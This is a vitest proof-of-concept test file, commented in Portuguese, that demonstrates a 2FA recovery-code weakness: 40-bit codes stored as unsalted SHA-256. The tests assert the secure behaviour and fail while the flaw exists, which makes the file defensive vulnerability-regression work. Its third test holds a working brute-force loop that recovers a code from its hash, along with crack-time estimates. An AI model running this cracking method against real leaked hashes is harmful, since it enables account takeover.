// PoC (r1-exposure-8): os códigos de recuperação do 2FA têm só 40 bits de entropia e são
// guardados como SHA-256 sem salt/pepper. Com um backup do banco (no modelo de ameaça),
// a enumeração dos 2^40 códigos recupera, numa única passagem, os códigos de qualquer pessoa.
//
// Comportamento SEGURO assertado (enquanto o bug existir, este teste FALHA):
//   1. entropia dos códigos >= 80 bits (fora de alcance de força bruta offline);
//   2. o valor guardado no banco NÃO pode ser sha256(texto) puro — precisa de pepper/salt,
//      senão uma única passagem quebra todo mundo de uma vez;
//   3. a partir só do hash (como num backup) não deve ser possível recuperar o texto do código.
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { FastifyInstance } from 'fastify'
import { api, createTestApp, createUser, sessionCookie } from './helpers'
import { sha256 } from '../src/lib/crypto'
import { newRecoveryCodes } from '../src/lib/totp'
import { totpCode } from '../src/lib/totp'

let app: FastifyInstance
beforeAll(async () => {
  app = await createTestApp()
})
afterAll(async () => {
  await app.close()
})

// Formata um inteiro de 40 bits no mesmo formato do newRecoveryCodes: "XXXXX-XXXXX" hex maiúsculo.
function codeFromInt(i: number): string {
  const s = i.toString(16).padStart(10, '0').toUpperCase()
  return `${s.slice(0, 5)}-${s.slice(5)}`
}
function intFromCode(code: string): number {
  return parseInt(code.replace('-', ''), 16)
}

// Liga o 2FA pela API de verdade e devolve os códigos em claro + o que ficou no banco.
async function enable2fa(email: string) {
  const user = await createUser(app, { roleId: 'suporte', email, totp: false })
  const cookie = await sessionCookie(app, user.id, 'active')
  const setup = await api(app, 'POST', '/api/auth/2fa/setup', { cookie })
  expect(setup.statusCode, setup.body).toBe(200)
  const secret = setup.json().secret as string
  const en = await api(app, 'POST', '/api/auth/2fa/enable', { cookie, body: { code: totpCode(secret, Date.now()) } })
  expect(en.statusCode, en.body).toBe(200)
  const recoveryCodes = en.json().recoveryCodes as string[]
  const row = await app.db.one<{ recovery_codes: string[] }>('select recovery_codes from users where id = $1', [user.id])
  return { recoveryCodes, stored: [...row.recovery_codes] }
}

describe('poc-r1-exposure-8: códigos de recuperação de 40 bits em SHA-256 sem salt', () => {
  it('entropia dos códigos é alta o bastante para resistir a força bruta offline', async () => {
    const codes = newRecoveryCodes(8)
    // Confere o formato real: 10 dígitos hex => 40 bits.
    for (const c of codes) expect(c).toMatch(/^[0-9A-F]{5}-[0-9A-F]{5}$/)
    const hexChars = codes[0].replace('-', '').length
    const entropyBits = hexChars * 4
    console.log(`[poc-r1-exposure-8] entropia por código = ${entropyBits} bits (${hexChars} dígitos hex)`)
    // Seguro: >= 80 bits. Hoje são 40 => FALHA.
    expect(entropyBits, 'código de recuperação tem pouca entropia (força bruta offline viável)').toBeGreaterThanOrEqual(80)
  })

  it('o banco guarda sha256(código) puro — uma passagem quebra todas as contas de uma vez', async () => {
    // Duas pessoas distintas; o backup contém os hashes de ambas.
    const a = await enable2fa('alice.2fa@x2win.bet.br')
    const b = await enable2fa('bob.2fa@x2win.bet.br')

    // O que o atacante teria num backup: o conjunto único de hashes (sem nada por-usuário).
    const backupDump = new Set<string>([...a.stored, ...b.stored])

    // Prova de que é sha256 sem salt/pepper: o hash do texto, calculado por qualquer um,
    // bate exatamente com o que está no banco — e vale para as duas pessoas ao mesmo tempo.
    const matchedA = a.recoveryCodes.filter((c) => backupDump.has(sha256(c))).length
    const matchedB = b.recoveryCodes.filter((c) => backupDump.has(sha256(c))).length
    console.log(`[poc-r1-exposure-8] sha256(texto) bate no dump: alice=${matchedA}/8 bob=${matchedB}/8`)
    expect(matchedA).toBe(8)
    expect(matchedB).toBe(8)

    // Seguro: o valor guardado NÃO deveria ser recuperável como sha256(texto) puro
    // (deveria ter pepper/salt por-conta). Hoje é => FALHA.
    const unsaltedRecoverable = matchedA === 8 && matchedB === 8
    expect(unsaltedRecoverable, 'banco guarda SHA-256 sem salt/pepper: um único passe quebra todos os usuários').toBe(false)
  })

  it('recupera o texto de um código real a partir SÓ do hash (força bruta do espaço de 40 bits)', async () => {
    // Monta um "backup": hashes de muitos códigos gerados pela própria produção.
    // Continua gerando até ter um alvo com valor baixo o suficiente para a força bruta
    // caber no orçamento do teste — o espaço real é 2^40, aqui só provamos o método.
    const TARGET_CAP = 3_000_000 // teto de iterações da força bruta (prova de método)
    const MAX_DRAWS = 8_000_000
    const dump = new Set<string>()
    let draws = 0
    let minVal = Number.POSITIVE_INFINITY
    let minHash = ''
    while (minVal >= TARGET_CAP && draws < MAX_DRAWS) {
      for (const code of newRecoveryCodes(8)) {
        draws++
        const h = sha256(code)
        dump.add(h)
        const v = intFromCode(code)
        if (v < minVal) {
          minVal = v
          minHash = h
        }
      }
    }
    expect(minVal, 'não achei alvo abaixo do teto dentro do orçamento de amostragem').toBeLessThan(TARGET_CAP)

    // ATACANTE: tem apenas o conjunto de hashes (minHash). Não olha o texto em claro.
    // Varre o espaço 0..minVal, formata, aplica SHA-256 e compara com o dump.
    const t0 = Date.now()
    let recovered: string | null = null
    let hashes = 0
    for (let i = 0; i <= minVal; i++) {
      hashes++
      const candidate = codeFromInt(i)
      if (sha256(candidate) === minHash) {
        recovered = candidate
        break
      }
    }
    const secs = (Date.now() - t0) / 1000
    const rate = hashes / Math.max(secs, 1e-9)
    const fullSpaceSecs = 2 ** 40 / rate
    console.log(
      `[poc-r1-exposure-8] recuperado=${recovered} em ${hashes.toLocaleString()} hashes / ${secs.toFixed(2)}s ` +
        `(~${(rate / 1e6).toFixed(2)}M sha256/s nesta CPU; 2^40 em ~${(fullSpaceSecs / 60).toFixed(0)} min por CPU, ` +
        `~1 min numa GPU a 2e10 h/s)`,
    )

    // O código foi recuperado só a partir do hash (confirma que está no dump).
    expect(recovered, 'não recuperei o código a partir do hash').not.toBeNull()
    expect(dump.has(sha256(recovered!))).toBe(true)

    // Seguro: a partir do hash de um backup NÃO deveria dar para recuperar o texto do código
    // dentro de um espaço de busca viável. Hoje dá => FALHA.
    expect(recovered, 'código de recuperação recuperável a partir do hash do backup (40 bits, SHA-256 sem salt)').toBeNull()
  }, 120_000)
})
